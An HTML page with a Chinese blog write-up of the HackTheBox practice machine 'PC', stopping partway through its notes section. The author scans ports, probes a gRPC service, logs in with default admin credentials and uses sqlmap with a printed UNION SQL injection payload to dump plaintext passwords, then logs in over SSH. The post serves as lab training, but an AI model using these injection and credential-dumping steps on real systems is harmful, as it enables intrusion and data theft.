<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>HTB-PC通关记录 | Peony</title><meta name="author" content="Peony"><meta name="copyright" content="Peony"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文记录了作者在通关 HackTheBox 靶机 PC 中遇到的问题以及踩坑后的解决方案。涉及 gRPC 服务探测，sqlmap注入获取立足点。">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-PC通关记录">
<meta property="og:url" content="https://peonycsa.com/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="Peony">
<meta property="og:description" content="本文记录了作者在通关 HackTheBox 靶机 PC 中遇到的问题以及踩坑后的解决方案。涉及 gRPC 服务探测，sqlmap注入获取立足点。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg">
<meta property="article:published_time" content="2023-07-09T17:17:11.000Z">
<meta property="article:modified_time" content="2023-07-16T07:21:25.497Z">
<meta property="article:author" content="Peony">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="HackTheBox">
<meta property="article:tag" content="PC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg"><link rel="shortcut icon" href="https://pic.imgdb.cn/item/647c139af024cca1732734de.png"><link rel="canonical" href="https://peonycsa.com/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HTB-PC通关记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-16 15:21:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Peony"><span class="site-name">Peony</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB-PC通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-09T17:17:11.000Z" title="发表于 2023-07-10 01:17:11">2023-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-16T07:21:25.497Z" title="更新于 2023-07-16 15:21:25">2023-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>靶机 IP :  10.10.11.214</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>按照常规的方法：使用Nmap对靶机进行扫描，通过 TCP 、 UDP 扫描端口、获取开放端口对应信息、系统版本信息。</p>
<p>下面是通过 TCP 、UDP 扫描发现的开放端口信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -Pn -sT -p- --min-rate 10000 10.10.11.214 -oN nmapscan/portscan.txt</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:19 CST</span><br><span class="line">Nmap scan report for 10.10.11.214</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">50051/tcp open  unknown</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 84.48 seconds</span><br><span class="line"></span><br><span class="line">$ sudo nmap -Pn -sU -p- --min-rate 10000 10.10.11.214 -oN nmapscan/uportscan.txt</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:21 CST</span><br><span class="line">Nmap scan report for 10.10.11.214</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 65534 open|filtered udp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE</span><br><span class="line">50051/udp closed unknown</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds</span><br><span class="line"></span><br><span class="line">$ sudo nmap -Pn -sT -sCV -O -p22,50051 --min-rate 10000 10.10.11.214 -oN nmapscan/servscan.txt</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:29 CST</span><br><span class="line">Nmap scan report for 10.10.11.214</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">50051/tcp open  unknown</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)        No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>分析 Nmap 的扫描结果，可以知道目标机器打开了22端口（ ssh 服务）和50051端口（服务未知）。</p>
<p>通过 Google 和 Github 搜索，查询到 50051 端口是 gRPC 服务的默认端口<sup><a href="#gRPC-%E6%9C%8D%E5%8A%A1">①</a></sup>。</p>
<h3 id="gRPC-服务探测"><a href="#gRPC-服务探测" class="headerlink" title="gRPC 服务探测"></a>gRPC 服务探测</h3><p>进一步查找相关工具，发现有两个开源工具能够连接gRPC服务：<code>grpcurl</code> （命令行）和 <code>grpcui</code> （界面）<sup><a href="#go-install-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">②</a></sup>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install grpcurl</span></span><br><span class="line">go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest</span><br><span class="line"><span class="comment"># install grpcurl</span></span><br><span class="line">go install github.com/fullstorydev/grpcui/cmd/grpcui@latest</span><br></pre></td></tr></table></figure>

<p>使用二者都可以对50051端口进行访问。</p>
<p>首先使用 <code>grpcurl</code> 工具访问靶机 50051 端口<sup><a href="#grpcurl-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8">③</a></sup>：</p>
<ol>
<li>使用 <code>-plaintext</code> 加密方式，使用 <code>list</code> 参数查看 gRPC 服务——只存在一个自定义服务 <code>SimpleApp</code> ，它很明显是目标服务。</li>
<li>继续追踪 <code>SimpleApp</code> 服务存在哪些方法和详细请求方法（ <code>request</code> ），使用 <code>-plaintext</code> 加密方式和 <code>describe</code> 参数，发现该服务存在三个方法 <code>LoginUser</code> ， <code>RegisterUser</code> ， <code>getInfo</code> ，以及对应的请求方法 <code>.LoginUserRequest </code> ，<code>.RegisterUserRequest</code> ，<code>.getInfoRequest</code> 。</li>
<li>分别使用 <code>describe</code> 参数查看请求方法 <code>.LoginUserRequest </code> ，<code>.RegisterUserRequest</code> ，<code>.getInfoRequest</code> 所需的请求参数。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># list the gRPC sercice name</span><br><span class="line">$ grpcurl -plaintext 10.10.11.214:50051 list</span><br><span class="line">SimpleApp</span><br><span class="line">grpc.reflection.v1alpha.ServerReflection</span><br><span class="line"></span><br><span class="line"># decribe the methods of the service SimpleApp</span><br><span class="line">$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp</span><br><span class="line">SimpleApp is a service:</span><br><span class="line">service SimpleApp &#123;</span><br><span class="line">  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</span><br><span class="line">  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );</span><br><span class="line">  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest</span><br><span class="line">RegisterUserRequest is a message:</span><br><span class="line">message RegisterUserRequest &#123;</span><br><span class="line">  string username = 1;</span><br><span class="line">  string password = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest</span><br><span class="line">LoginUserRequest is a message:</span><br><span class="line">message LoginUserRequest &#123;</span><br><span class="line">  string username = 1;</span><br><span class="line">  string password = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest</span><br><span class="line">getInfoRequest is a message:</span><br><span class="line">message getInfoRequest &#123;</span><br><span class="line">  string id = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上文所获取的信息，试试直接用 <code>admin:admin</code> 弱口令登录，没想到一下就成功了。返回了 <code>id</code> 参数和一个 JWT 的 <code>token</code> 值<sup><a href="#grpcurl-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8">④</a></sup>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ grpcurl -vv -d &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27; -plaintext 10.10.11.214:50051 SimpleApp.LoginUser</span><br><span class="line"></span><br><span class="line">Resolved method descriptor:</span><br><span class="line">rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</span><br><span class="line"></span><br><span class="line">Request metadata to send:</span><br><span class="line">(empty)</span><br><span class="line"></span><br><span class="line">Response headers received:</span><br><span class="line">content-type: application/grpc</span><br><span class="line">grpc-accept-encoding: identity, deflate, gzip</span><br><span class="line"></span><br><span class="line">Estimated response size: 16 bytes</span><br><span class="line"></span><br><span class="line">Response contents:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;message&quot;: &quot;Your id is 33.&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Response trailers received:</span><br><span class="line">token: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODcxMTkxMzV9.kZacDAWwQJFdTb420SmvGJjerGN_qElGIqxc5Djx9SU&#x27;</span><br><span class="line">Sent 1 request and received 1 response</span><br></pre></td></tr></table></figure>

<p>JWT 解密如下<sup><a href="#JWT-%E5%AE%9A%E4%B9%89">⑤</a></sup>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">token:b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIygyxEQ850zsBXgoWNsnbNLuw&#x27;</span><br><span class="line">=======================================================</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;payload&quot;: &#123;</span><br><span class="line">        &quot;user_id&quot;: &quot;admin&quot;,</span><br><span class="line">        &quot;exp&quot;: 1687846443</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有发现可用信息，因此在这卡住了。于是我又去找了图形化界面 <code>grpcui</code> 试试，然后发现结果相差不多。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grpcui -plaintext  10.10.11.214:50051</span><br><span class="line">gRPC Web UI available at http://127.0.0.1:34417/</span><br></pre></td></tr></table></figure>

<h2 id="sql-注入获取立足点"><a href="#sql-注入获取立足点" class="headerlink" title="sql 注入获取立足点"></a>sql 注入获取立足点</h2><p>峰回路转，某次输错 <code>id</code> 参数的时候发现了报错信息，猛然意识到这里会不会存在注入？于是试图抓一下 request 包交由 sqlmap 一下。但是在抓本地的包又踩到一个意料之外的坑，详情请见下文的注释，这里就不深入展开了<sup><a href="#Burp%E4%B8%8ESwitchOmega-%E5%A6%82%E4%BD%95%E6%8A%93%E6%9C%AC%E5%9C%B0%E5%8C%85">⑥</a></sup>。</p>
<p><img src="https://pic.imgdb.cn/item/64aa852a1ddac507cc5f7b01.png" alt="意外发现抱错"></p>
<p>我将抓到的 request 包保存为 <code>id.req</code> 文件保存，然后使用 <code>*</code> 标记 <code>id</code> 参数<sup><a href="#sqlmap-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E5%85%A5%E6%A0%87%E8%AE%B0">⑦</a></sup>。<br>在确认存在 sql 注入之后，直接使用 <code>--dump</code> 参数获取账号密码，最终取得靶机的基础立足点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r id.req --dbms=sqlite --batch</span><br><span class="line">---</span><br><span class="line">Parameter: JSON #1* ((custom) POST)</span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIy</span><br><span class="line">gyxEQ850zsBXgoWNsnbNLuw&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;769 UNION ALL SELECT CHAR(113,120,118,107,113)||CHAR(100,77,102,114,78,99,111,113,116,70,113,90,79,68,104,80,115,71</span><br><span class="line">,77,117,78,108,114,109,105,120,97,100,117,99,72,99,72,83,115,104,70,65,86,90)||CHAR(113,122,112,106,113)-- Klui&quot;&#125;]&#125;</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">$ sqlmap -r id.req --dump --batch</span><br><span class="line"></span><br><span class="line">Database: &lt;current&gt;</span><br><span class="line">Table: accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+------------------------+----------+</span><br><span class="line">| password               | username |</span><br><span class="line">+------------------------+----------+</span><br><span class="line">| admin                  | admin    |</span><br><span class="line">| HereIsYourPassWord1431 | sau      |</span><br><span class="line">+------------------------+----------+</span><br></pre></td></tr></table></figure>

<p>通过 <code>ssh</code> 直接登录 <code>sau</code> 用户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ssh sau@pc.htb</span><br><span class="line"># HereIsYourPassWord1431</span><br><span class="line">sau@pc:~$ uname</span><br><span class="line">Linux</span><br><span class="line">sau@pc:~$ uname -a</span><br><span class="line">Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">sau@pc:~$ id</span><br><span class="line">uid=1001(sau) gid=1001(sau) groups=1001(sau)</span><br><span class="line">sau@pc:~$ sudo -l</span><br><span class="line">[sudo] password for sau: </span><br><span class="line">Sorry, user sau may not run sudo on localhost.</span><br><span class="line">sau@pc:~$ whoami</span><br><span class="line">sau</span><br><span class="line">sau@pc:~$ </span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="hosts-文件修改"><a href="#hosts-文件修改" class="headerlink" title="hosts 文件修改"></a>hosts 文件修改</h3><p><code>/etc/hosts</code> 文件是一个用于映射 IP 地址和主机名的本地配置文件。它可以用来在本地系统中手动指定IP地址和主机名的对应关系，从而绕过 DNS 服务器进行主机名解析——在系统进行 DNS 解析之前，会首先去 <code>hosts</code> 文件中查找。在 <code>hosts</code> 文件中，如果能够找到被访问域名的 IP 地址，就不会再向 DNS 服务器发起请求。</p>
<p>该文件的格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># IP hosts_name Alias</span><br><span class="line"># example</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	K4.	K4</span><br></pre></td></tr></table></figure>

<p>每一行表示一个IP地址和主机名的对应关系。IP地址和主机名之间用空格或制表符分隔，可以有多个别名，多个别名之间也用空格或制表符分隔。以 <code>#</code> 开头的行表示注释，将被系统忽略。</p>
<p>hosts文件的作用是在本地系统中进行主机名解析，当系统需要解析一个主机名时，会首先查找hosts文件中是否有对应的IP地址。如果有，则直接使用该IP地址；如果没有，则会继续使用DNS服务器进行解析。</p>
<table>
<thead>
<tr>
<th align="left">系统</th>
<th align="left">hosts文件位置</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux 系统</td>
<td align="left"><code>/etc/hosts</code></td>
</tr>
<tr>
<td align="left">Windows 系统</td>
<td align="left"><code>C:\Windows\System32\drivers\etc\hosts</code></td>
</tr>
</tbody></table>
<h3 id="gRPC-服务"><a href="#gRPC-服务" class="headerlink" title="gRPC 服务"></a>gRPC 服务</h3><blockquote>
<p><strong>Why gRPC?</strong></p>
<p>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://grpc.io/">gRPC</a>是 Google Remote Procedure Call 。gRPC 是一个开源的 RPC 框架，用于创建可扩展和快速的 API 。它使网络系统的开发以及 gRPC 客户端和服务器应用程序之间的开放通信成为可能。gRPC 已经被一些顶级科技公司所接受，包括谷歌、IBM 、Netflix 等等。gRPC 框架依赖于 HTTP&#x2F;2 、协议缓冲区等尖端技术栈，以实现最佳的 API 保护、高性能远程过程调用和可扩展性。</p>
<h3 id="go-install-存在的问题"><a href="#go-install-存在的问题" class="headerlink" title="go install 存在的问题"></a>go install 存在的问题</h3><h4 id="代理问题"><a href="#代理问题" class="headerlink" title="代理问题"></a>代理问题</h4><p>因为审查的原因，go 无法直接安装，因此使用 <a target="_blank" rel="noopener" href="https://github.com/goproxy/goproxy.cn">goproxy</a>安装 go 的相关模块。</p>
<p>在终端中直接执行下方的命令</p>
